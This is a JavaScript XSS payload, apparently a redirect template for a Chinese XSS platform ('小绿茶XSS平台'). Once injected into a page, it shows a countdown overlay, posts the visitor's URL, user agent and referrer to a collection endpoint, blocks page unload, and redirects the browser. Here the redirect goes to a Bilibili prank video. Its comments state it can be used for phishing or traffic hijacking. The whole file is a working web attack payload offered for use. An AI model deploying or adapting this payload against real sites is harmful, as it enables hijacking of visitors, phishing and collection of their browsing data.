// XSS Payload
// 瑞克摇


// 页面重定向Payload - 小绿茶XSS平台模板
// 将用户重定向到指定页面，可用于钓鱼攻击或流量劫持

(function() {
    'use strict';
    
    // 配置信息
    var config = {
        targetUrl: 'https://www.bilibili.com/video/BV1GJ411x7h7/?spm_id_from=333.337.search-card.all.click&vd_source=cf2a1e9ce1587a27c5c76c7f8ba43954', // 目标URL
        delay: 3000, // 延迟时间（毫秒）
        showWarning: true, // 是否显示警告
        warningMessage: '🍃 页面即将跳转，请稍候...', // 警告消息
        countdown: true // 是否显示倒计时
    };
    
    // 创建跳转警告界面
    function createWarningOverlay() {
        var overlay = document.createElement('div');
        overlay.id = 'xss-redirect-overlay';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 999999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        `;
        
        var content = document.createElement('div');
        content.style.cssText = `
            background: white;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        `;
        
        var title = document.createElement('h2');
        title.style.cssText = 'color: #28a745; margin-bottom: 15px; font-size: 24px;';
        title.textContent = '🍃 小绿茶XSS平台';
        
        var message = document.createElement('p');
        message.style.cssText = 'color: #333; margin-bottom: 20px; font-size: 16px;';
        message.textContent = config.warningMessage;
        
        var countdown = document.createElement('div');
        countdown.id = 'xss-redirect-countdown';
        countdown.style.cssText = 'font-size: 48px; font-weight: bold; color: #dc3545; margin: 20px 0;';
        countdown.textContent = Math.ceil(config.delay / 1000);
        
        var targetInfo = document.createElement('div');
        targetInfo.style.cssText = 'color: #666; font-size: 14px; margin-top: 15px;';
        targetInfo.innerHTML = '目标地址:<br><small>' + escapeHtml(config.targetUrl) + '</small>';
        
        content.appendChild(title);
        content.appendChild(message);
        if (config.countdown) {
            content.appendChild(countdown);
        }
        content.appendChild(targetInfo);
        overlay.appendChild(content);
        
        return overlay;
    }
    
    // HTML转义函数
    function escapeHtml(text) {
        var map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return text.replace(/[&<>"']/g, function(m) { return map[m]; });
    }
    
    // 开始倒计时
    function startCountdown(overlay, countdownElement) {
        var remaining = Math.ceil(config.delay / 1000);
        
        var interval = setInterval(function() {
            remaining--;
            if (countdownElement) {
                countdownElement.textContent = remaining;
                
                // 改变颜色
                if (remaining <= 3) {
                    countdownElement.style.color = '#dc3545';
                } else if (remaining <= 5) {
                    countdownElement.style.color = '#ffc107';
                }
            }
            
            if (remaining <= 0) {
                clearInterval(interval);
                performRedirect();
            }
        }, 1000);
    }
    
    // 执行重定向
    function performRedirect() {
        console.log('🍃 小绿茶XSS平台 - 执行重定向');
        console.log('目标URL:', config.targetUrl);
        
        // 记录重定向事件
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', window.location.origin + '/api/collect', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                type: 'redirect',
                timestamp: new Date().toISOString(),
                from: window.location.href,
                to: config.targetUrl,
                userAgent: navigator.userAgent,
                referrer: document.referrer
            }));
        } catch (e) {
            console.log('记录重定向事件失败:', e);
        }
        
        // 执行重定向
        try {
            window.location.href = config.targetUrl;
        } catch (e) {
            console.log('重定向失败:', e);
            // 降级方案
            try {
                window.location.replace(config.targetUrl);
            } catch (e2) {
                console.log('降级重定向也失败:', e2);
            }
        }
    }
    
    // 主函数
    function main() {
        console.log('🍃 小绿茶XSS平台 - 重定向模块');
        console.log('将在 ' + config.delay + ' 毫秒后重定向到: ' + config.targetUrl);
        
        if (config.showWarning) {
            // 显示警告界面
            var overlay = createWarningOverlay();
            document.body.appendChild(overlay);
            
            var countdownElement = document.getElementById('xss-redirect-countdown');
            startCountdown(overlay, countdownElement);
            
            // 允许用户取消（隐藏功能）
            overlay.addEventListener('dblclick', function() {
                if (confirm('是否取消重定向？')) {
                    document.body.removeChild(overlay);
                    console.log('用户取消了重定向');
                }
            });
            
        } else {
            // 直接重定向
            setTimeout(performRedirect, config.delay);
        }
        
        // 防止页面关闭
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
        });
    }
    
    // 执行主函数
    main();
    
})();